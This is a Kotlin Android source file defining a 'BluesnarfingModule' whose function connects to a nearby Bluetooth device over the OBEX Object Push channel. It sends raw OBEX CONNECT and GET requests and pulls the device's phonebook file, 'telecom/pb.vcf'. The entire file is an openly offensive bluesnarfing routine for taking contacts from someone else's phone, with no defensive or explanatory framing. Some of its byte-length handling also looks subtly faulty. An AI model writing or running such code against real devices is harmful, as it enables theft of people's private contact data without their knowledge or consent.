package com.hereliesaz.blusnu.data

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream
import java.util.UUID

class BluesnarfingModule {

    private companion object {
        const val TAG = "BluesnarfingModule"

        // OBEX Opcodes
        const val OBEX_CONNECT_OPCODE: Byte = 0x80.toByte()
        const val OBEX_GET_OPCODE: Byte = 0x83.toByte()

        // OBEX Response Codes
        const val OBEX_SUCCESS_RESPONSE: Byte = 0xA0.toByte()

        // OBEX Headers
        const val OBEX_BODY_HEADER: Byte = 0x48.toByte()
    }

    // OBEX Object Push Profile UUID
    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")

    fun getPhonebook(device: BluetoothDevice): Result<String> {
        var socket: BluetoothSocket? = null
        return try {
            socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
            socket.connect()

            val outputStream = socket.outputStream
            val inputStream = socket.inputStream

            // OBEX CONNECT request
            val connectRequest = byteArrayOf(
                OBEX_CONNECT_OPCODE, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
            )
            outputStream.write(connectRequest)

            // Read the response
            val connectResponse = ByteArray(1024)
            val connectResponseLength = inputStream.read(connectResponse)
            if (connectResponse[0] != OBEX_SUCCESS_RESPONSE) {
                return Result.failure(IOException("OBEX CONNECT failed"))
            }

            // OBEX GET request for phonebook
            val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)
            val getRequest = byteArrayOf(
                OBEX_GET_OPCODE, 0x00, (10 + fileName.size).toByte(), 0x01, 0x00
            ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)
            outputStream.write(getRequest)

            // Read the response
            val getResponse = readObexResponse(inputStream)

            if (getResponse[0] == OBEX_SUCCESS_RESPONSE) {
                // Success, parse the response
                val bodyHeaderIndex = getResponse.indexOf(OBEX_BODY_HEADER)
                if (bodyHeaderIndex != -1) {
                    val bodyLength = (getResponse[bodyHeaderIndex + 1].toInt() shl 8) or getResponse[bodyHeaderIndex + 2].toInt()
                    val bodyStartIndex = bodyHeaderIndex + 3
                    val bodyEndIndex = bodyStartIndex + bodyLength - 3 // Adjusted for header length
                    Result.success(String(getResponse, bodyStartIndex, bodyEndIndex - bodyStartIndex))
                } else {
                    Result.failure(IOException("Phonebook data not found in response"))
                }
            } else {
                Result.failure(IOException("OBEX GET failed"))
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error during bluesnarfing", e)
            Result.failure(e)
        } finally {
            try {
                socket?.close()
            } catch (e: IOException) {
                Log.e(TAG, "Error closing socket", e)
            }
        }
    }

    private fun readObexResponse(inputStream: InputStream): ByteArray {
        val response = ByteArrayOutputStream()
        val header = ByteArray(3)
        inputStream.read(header)
        response.write(header)
        val length = (header[1].toInt() shl 8) or header[2].toInt()
        val payload = ByteArray(length - 3)
        inputStream.read(payload)
        response.write(payload)
        return response.toByteArray()
    }
}
